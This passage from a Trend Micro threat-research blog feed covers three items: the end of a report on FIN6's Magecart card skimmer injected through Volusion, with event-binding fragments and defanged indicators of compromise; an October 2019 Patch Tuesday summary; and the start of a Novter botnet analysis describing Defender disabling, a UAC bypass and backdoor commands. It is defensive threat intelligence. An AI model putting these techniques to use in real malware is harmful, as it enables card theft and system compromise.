<p>It’s also interesting to see that the skimmer in this attack binds to event “mousedown” and event “touchstart” of the payment submit button. The previous Group 6 skimmer binds to event “mouseup” and event “touchend”.</p>
<p>These events are different, but they are the pairs of each other that trigger the skimmer at almost the same time. It seems that they want to trigger the skimmer at the same moment, but the current version binds on two opposite events of the pairs to avoid detection from heuristic rules.</p>
<table>
<tbody>
<tr>
<td width="112"><strong>Target</strong></td>
<td width="440"><strong>Script of event binding</strong></td>
</tr>
<tr>
<td width="112">British Airways</td>
<td width="440">.bind(&#8220;mouseup touchend&#8221;, function(a) {…})</td>
</tr>
<tr>
<td width="112">Newegg</td>
<td width="440">.bind(&#8220;mouseup touchend&#8221;, function(e) {…})</td>
</tr>
<tr>
<td width="112">Volusion</td>
<td width="440">.bind(&#8216;mousedown touchstart&#8217;, z)</td>
</tr>
</tbody>
</table>
<p>It seems that Magecart is continuing to change and experiment with new attack methods, refining its skimmer to evade detection. Sophisticated groups such as these will always try to find new ways to stay undetected in their victims’ systems.</p>
<p>To defend against this type of threat, website owners should regularly check and <a href="https://www.trendmicro.com/vinfo/us/security/news/vulnerabilities-and-exploits/patching-problems-and-how-to-solve-them" target="_blank" rel="noopener noreferrer">strengthen their security</a> with patches and server segregation. Site owners should also employ robust authentication mechanisms, especially for those that store and <a href="https://www.trendmicro.com/vinfo/us/security/news/online-privacy/on-the-safe-side-building-better-data-protection-and-steering-clear-of-gdpr-violations" target="_blank" rel="noopener noreferrer">manage sensitive data</a>. IT and security teams should restrict or disable outdated components and habitually monitor websites and applications for any indicators of suspicious activity that could lead to data exfiltration, execution of unknown scripts, or unauthorized access and modification.</p>
<p>The following Trend Micro solutions, powered by <a href="http://go.trendmicro.com/sem/sem/www.trendmicro.com/us/business/xgen/index.html" target="_blank" rel="noopener noreferrer">XGen<img src="https://s.w.org/images/core/emoji/11.2.0/72x72/2122.png" alt="™" class="wp-smiley" style="height: 1em; max-height: 1em;" /> security</a>, protect users and businesses by blocking the scripts and preventing access to the malicious domains:</p>
<p><a href="https://www.trendmicro.com/en_us/forHome/products.html" target="_blank" rel="noopener noreferrer">Trend Micro Security</a><br />
<a href="https://www.trendmicro.com.ph/ph/business/complete-user-protection/index.html" target="_blank" rel="noopener noreferrer">Smart Protection Suites</a> and <a href="https://www.trendmicro.com/en_us/small-business/worry-free.html" target="_blank" rel="noopener noreferrer">Worry-Free<img src="https://s.w.org/images/core/emoji/11.2.0/72x72/2122.png" alt="™" class="wp-smiley" style="height: 1em; max-height: 1em;" /> Business Security</a><br />
<a href="https://www.trendmicro.com/en_us/business/products/network.html?utm_campaign=VURL:www.trendmicro.com&amp;utm_medium=VURL&amp;utm_source=/us/business/cyber-security/index.html" target="_blank" rel="noopener noreferrer">Trend Micro Network Defense</a><br />
<a href="https://www.trendmicro.com/en_us/business/products/hybrid-cloud.html" target="_blank" rel="noopener noreferrer">Hybrid Cloud Security</a></p>
<p>Researcher Marcel Afrahim also published a Medium post on this case.</p>
<p><em><strong>Indicators of Compromise</strong></em></p>
<table>
<tbody>
<tr>
<td width="520"><strong>Indicator</strong></td>
<td width="90"><strong>Attribution</strong></td>
<td width="97"><strong>Detection name</strong></td>
</tr>
<tr>
<td width="520">volusion-cdn[.]com</td>
<td width="90">FIN6 exfiltration server domain</td>
<td width="97"></td>
</tr>
<tr>
<td width="520">https[:]//volusion-cdn[.]com/analytics/beacon</td>
<td width="90">FIN6 exfiltration server URL</td>
<td width="97"></td>
</tr>
<tr>
<td width="520">https[:]//storage[.]googleapis[.]com/volusionapi/resources.js</td>
<td width="90">FIN6 credit card skimmer URL</td>
<td width="97"></td>
</tr>
<tr>
<td width="520">2348433df49e73217969a45726c53441f092c4a6fce57d1d58a6cf79d3976058</td>
<td width="90">FIN6 credit card skimmer hash</td>
<td width="97">TrojanSpy.JS.MAGECART.C</td>
</tr>
<tr>
<td width="520">cee25c699a14a04c6e1b6e6fcd5ce7d4414c9f324b62509a7af14ae5bf749af8</td>
<td width="90">FIN6 credit card skimmer hash</td>
<td width="97">TrojanSpy.JS.MAGECART.D</td>
</tr>
<tr>
<td width="520">d03f18a71ce059a79840a38aad4944426f0524bbd68a7a8fb7003c82996e6533</p>
<p>&nbsp;</td>
<td width="90">FIN6 credit card skimmer hash</td>
<td width="97">TrojanSpy.JS.MAGECART.D</td>
</tr>
</tbody>
</table>
<p>A Volusion spokesperson has added the following statement:</p>
<p>&#8220;Volusion was alerted of a data security incident and can confirm that it was resolved within a few hours of notification. We are coordinating with authorities on this matter, and continue to enhance our systems that detect and prevent unauthorized access to user accounts.</p>
<p>A limited portion of customer information was compromised from a subset of our merchants. This included credit card information, but not other associated personally identifying details. We are not aware of any fraudulent activity connected to this matter.</p>
<p>Volusion has taken action to help secure accounts, and we are continuing to monitor this matter in order to assure the security of our merchants.&#8221;</p>
<p>The post <a rel="nofollow" href="https://blog.trendmicro.com/trendlabs-security-intelligence/fin6-compromised-e-commerce-platform-via-magecart-to-inject-credit-card-skimmers-into-thousands-of-online-shops/">FIN6 Compromised E-commerce Platform via Magecart to Inject Credit Card Skimmers Into Thousands of Online Shops</a> appeared first on <a rel="nofollow" href="https://blog.trendmicro.com/trendlabs-security-intelligence"></a>.</p>
<div class="feedflare">
<a href="http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=PRN9qN2jHBg:6PoyoF2tUrA:yIl2AUoC8zA"><img src="http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=yIl2AUoC8zA" border="0"></img></a> <a href="http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=PRN9qN2jHBg:6PoyoF2tUrA:F7zBnMyn0Lo"><img src="http://feeds.feedburner.com/~ff/Anti-MalwareBlog?i=PRN9qN2jHBg:6PoyoF2tUrA:F7zBnMyn0Lo" border="0"></img></a> <a href="http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=PRN9qN2jHBg:6PoyoF2tUrA:qj6IDK7rITs"><img src="http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=qj6IDK7rITs" border="0"></img></a> <a href="http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=PRN9qN2jHBg:6PoyoF2tUrA:V_sGLiPBpWU"><img src="http://feeds.feedburner.com/~ff/Anti-MalwareBlog?i=PRN9qN2jHBg:6PoyoF2tUrA:V_sGLiPBpWU" border="0"></img></a> <a href="http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=PRN9qN2jHBg:6PoyoF2tUrA:l6gmwiTKsz0"><img src="http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=l6gmwiTKsz0" border="0"></img></a> <a href="http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=PRN9qN2jHBg:6PoyoF2tUrA:gIN9vFwOqvQ"><img src="http://feeds.feedburner.com/~ff/Anti-MalwareBlog?i=PRN9qN2jHBg:6PoyoF2tUrA:gIN9vFwOqvQ" border="0"></img></a> <a href="http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=PRN9qN2jHBg:6PoyoF2tUrA:TzevzKxY174"><img src="http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=TzevzKxY174" border="0"></img></a>
</div><img src="http://feeds.feedburner.com/~r/Anti-MalwareBlog/~4/PRN9qN2jHBg" height="1" width="1" alt=""/>]]></content:encoded>
							<wfw:commentRss>https://blog.trendmicro.com/trendlabs-security-intelligence/fin6-compromised-e-commerce-platform-via-magecart-to-inject-credit-card-skimmers-into-thousands-of-online-shops/feed/</wfw:commentRss>
		<slash:comments>0</slash:comments>
							<feedburner:origLink>https://blog.trendmicro.com/trendlabs-security-intelligence/fin6-compromised-e-commerce-platform-via-magecart-to-inject-credit-card-skimmers-into-thousands-of-online-shops/</feedburner:origLink></item>
		<item>
		<title>Short October Patch Tuesday Includes Remote Desktop Client, Browser, and Authentication Patches</title>
		<link>http://feeds.trendmicro.com/~r/Anti-MalwareBlog/~3/doQ0hJsNofo/</link>
				<comments>https://blog.trendmicro.com/trendlabs-security-intelligence/short-october-patch-tuesday-includes-remote-desktop-client-browser-and-authentication-patches/#respond</comments>
				<pubDate>Wed, 09 Oct 2019 02:28:40 +0000</pubDate>
		<dc:creator><![CDATA[Trend Micro]]></dc:creator>
				<category><![CDATA[Vulnerabilities]]></category>
		<category><![CDATA[October 2019 Patch Tuesday]]></category>
		<category><![CDATA[Patch Tuesday]]></category>

		<guid isPermaLink="false">https://blog.trendmicro.com/trendlabs-security-intelligence/?p=86158</guid>
				<description><![CDATA[<img width="200" height="200" src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2016/05/Patch-Tuesday05-200x200.jpg" class="webfeedsFeaturedVisual wp-post-image" alt="" style="float: left; margin-right: 5px;" link_thumbnail="" srcset="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2016/05/Patch-Tuesday05-200x200.jpg 200w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2016/05/Patch-Tuesday05-380x380.jpg 380w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2016/05/Patch-Tuesday05-300x300.jpg 300w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2016/05/Patch-Tuesday05.jpg 400w" sizes="(max-width: 200px) 100vw, 200px" /><p>October’s Patch Tuesday is relatively modest, with Microsoft releasing a total of 59 patches. However, this shorter list still warrants attention. Nine of the 59 were still identified as Critical, while the remaining 50 were labeled Important. Most of the critical bulletins were for various Internet Explorer and Microsoft Edge vulnerabilities, with one covering a Remote Desktop Client vulnerability. The Important bulletins fixed several issues, including NTLM and Microsoft IIS server vulnerabilities.</p>
<p>The post <a rel="nofollow" href="https://blog.trendmicro.com/trendlabs-security-intelligence/short-october-patch-tuesday-includes-remote-desktop-client-browser-and-authentication-patches/">Short October Patch Tuesday Includes Remote Desktop Client, Browser, and Authentication Patches</a> appeared first on <a rel="nofollow" href="https://blog.trendmicro.com/trendlabs-security-intelligence"></a>.</p>
]]></description>
								<content:encoded><![CDATA[<img width="200" height="200" src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2016/05/Patch-Tuesday05-200x200.jpg" class="webfeedsFeaturedVisual wp-post-image" alt="" style="float: left; margin-right: 5px;" link_thumbnail="" srcset="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2016/05/Patch-Tuesday05-200x200.jpg 200w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2016/05/Patch-Tuesday05-380x380.jpg 380w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2016/05/Patch-Tuesday05-300x300.jpg 300w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2016/05/Patch-Tuesday05.jpg 400w" sizes="(max-width: 200px) 100vw, 200px" /><p>October’s Patch Tuesday is relatively modest, with Microsoft releasing a total of 59 patches. However, this shorter list still warrants attention. Nine of the 59 were still identified as Critical, while the remaining 50 were labeled Important. Most of the critical bulletins were for various Internet Explorer and Microsoft Edge vulnerabilities, with one covering a Remote Desktop Client vulnerability. The Important bulletins fixed several issues, including NTLM and Microsoft IIS server vulnerabilities.</p>
<p>Here’s a closer look at the notable vulnerabilities patched this month:</p>
<p><strong>Remote Desktop Client</strong></p>
<p><a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-1333">CVE-2019-1333</a> covered a remote code execution (RCE) vulnerability in Microsoft’s Remote Desktop Client. However, for an attacker to successfully exploit and gain remote access to a targeted system using this vulnerability they must have the user access their malicious RDP server, which may involve some use of social engineering.</p>
<p><strong>Browser vulnerabilities</strong></p>
<p><a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-1060">CVE-2019-1060</a>, <a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-1238">CVE-2019-1238</a>, and <a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-1239">CVE-2019-1239</a> are vulnerabilities found in how the VBScript engine of Internet Explorer handles objects in memory. <a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-1307">CVE-2019-1307</a>, <a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-1308">CVE-2019-1308</a>, <a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-1335">CVE-2019-1335</a>, and <a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-1366">CVE-2019-1366</a> are similar vulnerabilities in the Chakra scripting engine of Microsoft Edge.</p>
<p>For both cases, a hacker can use these vulnerabilities to corrupt memory in a way that would make it possible to run arbitrary code with the same rights as the user. These vulnerabilities allow an attacker to gain the same privileges as the logged on user.</p>
<p><strong>Authentication vulnerabilities</strong></p>
<p><a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-1166">CVE-2019-1166</a> is a tampering vulnerability in Microsoft’s <a href="https://docs.microsoft.com/en-us/windows/win32/secauthn/microsoft-ntlm">NTLM</a> authentication protocol. This vulnerability could allow a possible man-in-the-middle (MITM) attacker to bypass protection mechanisms employed by NTLM called Message Integrity Check (MIC) and downgrade its security features. This is done <em>without</em> the signature of the NTLM packet becoming invalid.</p>
<p><a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-1338">CVE-2019-1338</a> is a security feature bypass vulnerability where a MitM attack could bypass NTLMv2 protection if the client is also sending out LMv2 responses. A successful exploit of this vulnerability could allow an attacker to downgrade NTLM security features, but they would need to modify NTLM traffic exchange to do so.</p>
<p><strong>Microsoft IIS Server</strong></p>
<p><a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-1365">CVE-2019-1365</a> is an elevation of privilege vulnerability that could allow a potential attacker to perform cross-site scripting and run scripts in the same security context as the user. This vulnerability exists because of instances where the Microsoft IIS server inadequately sanitizes a specially crafted request.</p>
<p><strong>Trend Micro solutions</strong></p>
<p>Users with affected installations are advised to prioritize the updates in order to avoid possible system exploitation through unpatched vulnerabilities. The <a href="https://www.trendmicro.com/en_us/business/products/hybrid-cloud.html">Trend Micro<img src="https://s.w.org/images/core/emoji/11.2.0/72x72/2122.png" alt="™" class="wp-smiley" style="height: 1em; max-height: 1em;" /> Deep Security<img src="https://s.w.org/images/core/emoji/11.2.0/72x72/2122.png" alt="™" class="wp-smiley" style="height: 1em; max-height: 1em;" /></a> and <a href="https://www.trendmicro.com/en_us/business/products/user-protection/sps.html">Vulnerability Protection</a> solutions also protect systems and users from threats targeting the vulnerabilities included in this month’s Patch Tuesday, updating or creating rules to address applicable vulnerabilities found. The following rules have been released to cover the appropriate vulnerabilities:</p>
<ul>
<li>1010008 &#8211; Microsoft Edge Chakra Scripting Engine Memory Corruption Vulnerability (CVE-2019-1335)</li>
<li>1010009 &#8211; Microsoft Windows Elevation of Privilege Vulnerability (CVE-2019-1364)</li>
<li>1010015 &#8211; Microsoft XML Remote Code Execution Vulnerability (CVE-2019-1060)</li>
<li>1010016 &#8211; Microsoft Internet Explorer VBScript Engine Remote Code Execution Vulnerability (CVE-2019-1238)</li>
<li>1010017 &#8211; Microsoft Internet Explorer VBScript Engine Remote Code Execution Vulnerability (CVE-2019-1239)</li>
<li>1010018 &#8211; Microsoft Edge Chakra Scripting Engine Memory Corruption Vulnerability (CVE-2019-1307)</li>
<li>1010019 &#8211; Microsoft Edge Chakra Scripting Engine Memory Corruption Vulnerability (CVE-2019-1308)</li>
<li>1010020 &#8211; Microsoft Edge Chakra Scripting Engine Memory Corruption Vulnerability (CVE-2019-1366)</li>
<li>1010021 &#8211; Microsoft Graphics Components Information Disclosure Vulnerability (CVE-2019-1361)</li>
</ul>
<p><a href="https://www.trendmicro.com/en_us/business/products/network/intrusion-prevention/tipping-point-threat-protection-system.html" target="_blank" rel="noopener noreferrer">Trend Micro<img src="https://s.w.org/images/core/emoji/11.2.0/72x72/2122.png" alt="™" class="wp-smiley" style="height: 1em; max-height: 1em;" /> TippingPoint®</a> customers are protected from threats and attacks that may exploit some of the vulnerabilities fixed this month via the following <a href="https://www.trendmicro.com/en_us/business/products/network/intrusion-prevention/threat-intelligence.html" target="_blank" rel="noopener noreferrer">MainlineDV</a> filters:</p>
<ul>
<li>36259: HTTP: Microsoft Windows Win32k tiff Processing Elevation of Privilege Vulnerability</li>
<li>36319: HTTP: Microsoft Edge JIT Type Confusion Vulnerability</li>
<li>36320: HTTP: Microsoft Edge JIT Type Confusion Vulnerability</li>
<li>36321: HTTP: Microsoft Internet Explorer JScript Engine Type Confusion Vulnerability</li>
<li>36322: HTTP: Microsoft Internet Explorer MSXML Use-After-Free Vulnerability</li>
<li>36323: HTTP: Microsoft Internet Explorer VBScript Libraries Type Confusion Vulnerability</li>
<li>36324: HTTP: Microsoft Edge Chakra JIT Type Confusion Vulnerability</li>
</ul>
<p>We are working hard to continue to provide protection where possible. You can track of the latest released rules through the following <a href="https://www.trendmicro.com/vinfo/us/threat-encyclopedia/vulnerability/7957/19050-october-8-2019">advisory</a>.</p>
<p>The post <a rel="nofollow" href="https://blog.trendmicro.com/trendlabs-security-intelligence/short-october-patch-tuesday-includes-remote-desktop-client-browser-and-authentication-patches/">Short October Patch Tuesday Includes Remote Desktop Client, Browser, and Authentication Patches</a> appeared first on <a rel="nofollow" href="https://blog.trendmicro.com/trendlabs-security-intelligence"></a>.</p>
<div class="feedflare">
<a href="http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=doQ0hJsNofo:EOQmn3e4XU0:yIl2AUoC8zA"><img src="http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=yIl2AUoC8zA" border="0"></img></a> <a href="http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=doQ0hJsNofo:EOQmn3e4XU0:F7zBnMyn0Lo"><img src="http://feeds.feedburner.com/~ff/Anti-MalwareBlog?i=doQ0hJsNofo:EOQmn3e4XU0:F7zBnMyn0Lo" border="0"></img></a> <a href="http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=doQ0hJsNofo:EOQmn3e4XU0:qj6IDK7rITs"><img src="http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=qj6IDK7rITs" border="0"></img></a> <a href="http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=doQ0hJsNofo:EOQmn3e4XU0:V_sGLiPBpWU"><img src="http://feeds.feedburner.com/~ff/Anti-MalwareBlog?i=doQ0hJsNofo:EOQmn3e4XU0:V_sGLiPBpWU" border="0"></img></a> <a href="http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=doQ0hJsNofo:EOQmn3e4XU0:l6gmwiTKsz0"><img src="http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=l6gmwiTKsz0" border="0"></img></a> <a href="http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=doQ0hJsNofo:EOQmn3e4XU0:gIN9vFwOqvQ"><img src="http://feeds.feedburner.com/~ff/Anti-MalwareBlog?i=doQ0hJsNofo:EOQmn3e4XU0:gIN9vFwOqvQ" border="0"></img></a> <a href="http://feeds.trendmicro.com/~ff/Anti-MalwareBlog?a=doQ0hJsNofo:EOQmn3e4XU0:TzevzKxY174"><img src="http://feeds.feedburner.com/~ff/Anti-MalwareBlog?d=TzevzKxY174" border="0"></img></a>
</div><img src="http://feeds.feedburner.com/~r/Anti-MalwareBlog/~4/doQ0hJsNofo" height="1" width="1" alt=""/>]]></content:encoded>
							<wfw:commentRss>https://blog.trendmicro.com/trendlabs-security-intelligence/short-october-patch-tuesday-includes-remote-desktop-client-browser-and-authentication-patches/feed/</wfw:commentRss>
		<slash:comments>0</slash:comments>
							<feedburner:origLink>https://blog.trendmicro.com/trendlabs-security-intelligence/short-october-patch-tuesday-includes-remote-desktop-client-browser-and-authentication-patches/</feedburner:origLink></item>
		<item>
		<title>New Fileless Botnet Novter Distributed by KovCoreG Malvertising Campaign</title>
		<link>http://feeds.trendmicro.com/~r/Anti-MalwareBlog/~3/1s3zVxzbXkI/</link>
				<comments>https://blog.trendmicro.com/trendlabs-security-intelligence/new-fileless-botnet-novter-distributed-by-kovcoreg-malvertising-campaign/#respond</comments>
				<pubDate>Tue, 01 Oct 2019 12:00:03 +0000</pubDate>
		<dc:creator><![CDATA[Trend Micro]]></dc:creator>
				<category><![CDATA[Bad Sites]]></category>
		<category><![CDATA[Botnets]]></category>
		<category><![CDATA[Malware]]></category>
		<category><![CDATA[botnet]]></category>
		<category><![CDATA[KovCoreG]]></category>
		<category><![CDATA[malvertising]]></category>
		<category><![CDATA[Nodster]]></category>
		<category><![CDATA[Novter]]></category>

		<guid isPermaLink="false">https://blog.trendmicro.com/trendlabs-security-intelligence/?p=86137</guid>
				<description><![CDATA[<img width="200" height="125" src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-200x125.jpg" class="webfeedsFeaturedVisual wp-post-image" alt="" style="float: left; margin-right: 5px;" link_thumbnail="" srcset="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-200x125.jpg 200w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-768x480.jpg 768w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-1024x640.jpg 1024w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-640x400.jpg 640w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-900x563.jpg 900w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-440x275.jpg 440w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-380x238.jpg 380w" sizes="(max-width: 200px) 100vw, 200px" /><p>We found a new modular fileless botnet malware, which we named “Novter,” (also reported and known as “<a href="https://www.microsoft.com/security/blog/2019/09/26/bring-your-own-lolbin-multi-stage-fileless-nodersok-campaign-delivers-rare-node-js-based-malware/">Nodersok</a>” and “<a href="https://blog.talosintelligence.com/2019/09/divergent-analysis.html">Divergent</a>”) that the KovCoreG campaign has been distributing since March. We’ve been actively monitoring this threat since its emergence and early development, and saw it being frequently updated. <a href="https://www.proofpoint.com/us/threat-insight/post/threat-actor-profile-kovcoreg-kovter-saga">KovCoreG</a>, active since 2011, is a long-running campaign known for using the <a href="https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/kovter-an-evolving-malware-gone-fileless">Kovter</a> botnet malware, which was distributed mainly through malvertisements and <a href="https://www.trendmicro.com/vinfo/us/security/definition/exploit-kit">exploit kits</a>. Kovter has been involved in click fraud operations since 2015, using fraudulent ads that have reportedly cost businesses more than <a href="https://www.justice.gov/usao-edny/pr/two-international-cybercriminal-rings-dismantled-and-eight-defendants-indicted-causing">US$29 million</a>. The botnet was <a href="https://www.whiteops.com/3ve">taken down</a> at the end of 2018 through concerted efforts by law enforcement and cybersecurity experts, including Trend Micro.</p>
<p>The post <a rel="nofollow" href="https://blog.trendmicro.com/trendlabs-security-intelligence/new-fileless-botnet-novter-distributed-by-kovcoreg-malvertising-campaign/">New Fileless Botnet Novter Distributed by KovCoreG Malvertising Campaign</a> appeared first on <a rel="nofollow" href="https://blog.trendmicro.com/trendlabs-security-intelligence"></a>.</p>
]]></description>
								<content:encoded><![CDATA[<img width="200" height="125" src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-200x125.jpg" class="webfeedsFeaturedVisual wp-post-image" alt="" style="float: left; margin-right: 5px;" link_thumbnail="" srcset="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-200x125.jpg 200w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-768x480.jpg 768w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-1024x640.jpg 1024w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-640x400.jpg 640w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-900x563.jpg 900w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-440x275.jpg 440w, https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/08/Malware-380x238.jpg 380w" sizes="(max-width: 200px) 100vw, 200px" /><p><em><strong>By Jaromir Horejsi and Joseph C. Chen (Threat Researchers)</strong></em></p>
<p>We found a new modular fileless botnet malware, which we named “Novter,” (also reported and known as “<a href="https://www.microsoft.com/security/blog/2019/09/26/bring-your-own-lolbin-multi-stage-fileless-nodersok-campaign-delivers-rare-node-js-based-malware/">Nodersok</a>” and “<a href="https://blog.talosintelligence.com/2019/09/divergent-analysis.html">Divergent</a>”) that the KovCoreG campaign has been distributing since March. We’ve been actively monitoring this threat since its emergence and early development, and saw it being frequently updated. <a href="https://www.proofpoint.com/us/threat-insight/post/threat-actor-profile-kovcoreg-kovter-saga">KovCoreG</a>, active since 2011, is a long-running campaign known for using the <a href="https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/kovter-an-evolving-malware-gone-fileless">Kovter</a> botnet malware, which was distributed mainly through malvertisements and <a href="https://www.trendmicro.com/vinfo/us/security/definition/exploit-kit">exploit kits</a>. Kovter has been involved in click fraud operations since 2015, using fraudulent ads that have reportedly cost businesses more than <a href="https://www.justice.gov/usao-edny/pr/two-international-cybercriminal-rings-dismantled-and-eight-defendants-indicted-causing">US$29 million</a>. The botnet was <a href="https://www.whiteops.com/3ve">taken down</a> at the end of 2018 through concerted efforts by law enforcement and cybersecurity experts, including Trend Micro.</p>
<p>The dismantlement hasn’t deterred the cybercriminals. Though the botnet is dead, we noticed that the KovCoreG campaign didn’t stop their activities and instead developed another botnet. Working with ProofPoint’s threat researcher <a href="https://twitter.com/kafeine">Kafeine</a>, we were able to uncover a new fileless botnet malware — Novter — being distributed by the operators of KovCoreG.</p>
<p>While the malvertising attacks were originally focused on U.S.-based users, they have since expanded to several European countries starting this summer. Our telemetry also revealed that the malvertising attacks were being distributed through a few of top 100 websites in the U.S., which were also <a href="https://www.proofpoint.com/us/threat-insight/post/kovter-group-malvertising-campaign-exposes-millions-potential-malware-and-fraud">abused</a> by Kovter in their previous activities. Our analysis of Novter, particularly its most notable modules, are detailed in this <a href="https://documents.trendmicro.com/assets/Tech-Brief-New-Fileless-Botnet-Novter-Distributed-by-KovCoreG-Malvertising-Campaign.pdf" target="_blank" rel="noopener noreferrer"><strong><em>technical brief</em></strong></a>.</p>
<p align="center"><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/10/novter-1.jpg"><img src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/10/novter-1.jpg" alt="" width="450" /></a><br />
Figure 1. Infection chain of KovCoreG, Novter, and Nodster</p>
<h3><strong>KovCoreG’s attack chain</strong></h3>
<p>KovCoreG’s attacks are socially engineered malvertisments that lure unwitting users into downloading a software package needed to update their supposedly out-of-date Adobe Flash application. However, it instead drops a malicious HTML application (HTA) file named <em>Player{timestamp}.hta</em>. When the victim executes the HTA file, it will load additional scripts from a remote server (communication is RC4-encrypted) and run a PowerShell script that appears to take inspiration from the open-source <a href="https://github.com/EmpireProject/Empire/blob/master/data/module_source/management/Invoke-PSInject.ps1">Invoke-PSInject</a> project.</p>
<p align="center"><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/novter-2.png"><img src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/novter-2.png" alt="" width="300" /></a><br />
Figure 2. Screenshot showing an example of KovCoreG’s malvertisements (captured by ProofPoint)</p>
<p align="center"><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/novter-3.png"><img src="https://blog.trendmicro.com/trendlabs-security-intelligence/files/2019/09/novter-3.png" alt="" width="300" /></a><br />
Figure 3. Snapshot of KovCoreG’s malvertisement traffic (captured by ProofPoint)</p>
<p>The PowerShell script, in turn, will disable Windows Defender and Windows Update processes. It runs a shellcode to bypass User Account Control (UAC) via the <a href="http://www.endurant.io/cmstp/detecting-cmstp-enabled-code-execution-and-uac-bypass-with-sysmon/">CMSTPLUA</a> COM interface (related to connection management). The PowerShell script is also embedded with Novter, which will be executed <a href="https://www.trendmicro.com/vinfo/us/security/news/security-technology/security-101-defending-against-fileless-malware#memoryexploits">filelessly</a> via the PowerShell reflective <a href="https://powersploit.readthedocs.io/en/latest/CodeExecution/Invoke-ReflectivePEInjection/">injection</a> technique.</p>
<h3><strong>Analysis of the Novter malware</strong></h3>
<p>Novter is a backdoor in the form of an executable file. Immediately after its execution, it performs the following anti-debugging and anti-analysis checks:</p>
<ul>
<li>Searching for blacklisted processes and modules by comparing the CRC32 algorithms of their names with a list of hardcoded CRC32s</li>
<li>Checking if the number of cores is too small</li>
<li>Checking if the process is being debugged</li>
<li>Checking if the Sleep function is being manipulated</li>
</ul>
<p>If it finds any of aforementioned information, it is then reported to the C&amp;C server. Note that it uses different sets of C&amp;C servers for different purposes. One set, for instance, is solely used for anti-analysis reporting. After the affected machine’s environment is double-checked and reported, the malware goes to sleep for a long time.</p>
<p>The backdoor commands that Novter supports are:</p>
<ul>
<li>killall — Terminate a process and delete a file (for all modules)</li>
<li>kill — Terminate a process and delete a file (for a specific module)</li>
<li>stop — Terminate the process without deleting its file (for a specific module)</li>
<li>resume — Start a process (for a specific module)</li>
<li>modules — Download and execute an additional module</li>
<li>update — Download a new version and install the update</li>
<li>update_interval — Set an interval between two consecutive update attempts</li>
</ul>
<p>Novter communicates with its command-and-control (C&amp;C) servers and downloads multiple JavaScript modules for different purposes. We have identified three Novter modules, which include:</p>
<ul>
<li>A module that shows a technical support scam page on the victim’s machine</li>
<li>A module that abuses <a href="https://reqrypt.org/windivert.html">WinDivert</a> (Windows packet divert, a tool that enables network packets sent to and from Windows network stacks to be captured, modified, or dropped) to block the communication from processes like those from antivirus (AV) software</li>
